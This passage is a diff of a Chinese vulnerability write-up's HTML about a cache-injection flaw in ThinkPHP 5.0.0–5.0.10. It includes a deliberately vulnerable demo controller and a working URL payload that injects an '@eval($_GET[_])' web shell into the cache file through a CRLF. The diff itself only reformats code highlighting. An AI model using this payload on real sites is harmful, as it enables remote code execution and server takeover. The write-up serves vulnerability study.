@@ -440,21 +440,21 @@
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
             <h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>漏洞影响版本: 5.0.0&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.0.10</p>
 <p>application&#x2F;index&#x2F;controller&#x2F;Index.php</p>
-<pre><code class="php">&lt;?php
-namespace app\index\controller;
-use think\Cache;
-class Index
-&#123;
-    public function index()
-    &#123;
-        Cache::set(&quot;name&quot;,input(&quot;get.username&quot;));
-        return &#39;Cache success&#39;;
-    &#125;
-&#125;
-</code></pre>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>index<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span>
+<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Cache</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Index</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token class-name static-context">Cache</span><span class="token operator">::</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">,</span><span class="token function">input</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"get.username"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token string single-quoted-string">'Cache success'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>payload:</p>
-<pre><code>?username=p0l1st123%0d%0a@eval($_GET[_]);//
-</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">?username&#x3D;p0l1st123%0d%0a@eval($_GET[_]);&#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img lazyload src="/images/loading.svg" data-src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221815389.png" alt="image-20240607183904083"></p>
 <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>首先跟进Cache类的set方法，其首先通过单例模式init方法，创建了一个类实例，该类由cache的配置项type决定，默认情况下值为File</p>
 <p>本例中，self::$handler为library\think\cache\driver\File类实例</p>
